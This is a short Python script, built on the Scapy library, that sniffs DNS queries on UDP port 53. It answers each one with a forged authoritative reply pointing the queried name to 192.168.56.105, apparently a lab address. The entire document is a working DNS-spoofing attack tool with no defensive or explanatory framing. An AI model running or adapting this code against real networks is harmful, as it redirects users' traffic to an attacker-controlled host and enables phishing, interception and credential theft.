from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname
        if isinstance(qname, bytes):
            qname = qname.decode()
        print(f"[+] Spoofing DNS request for {qname}")

        # Construct spoofed DNS response
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(
                          id=pkt[DNS].id,
                          qr=1,  # response
                          aa=1,  # authoritative answer
                          qd=pkt[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=300, rdata="192.168.56.105"),
                          rcode=0
                      )
        send(spoofed_pkt, verbose=0)

def start_dns_spoof():
    print("[+] DNS Spoofer started...")
    sniff(filter="udp port 53", prn=dns_spoof, store=0)

if __name__ == "__main__":
    start_dns_spoof()
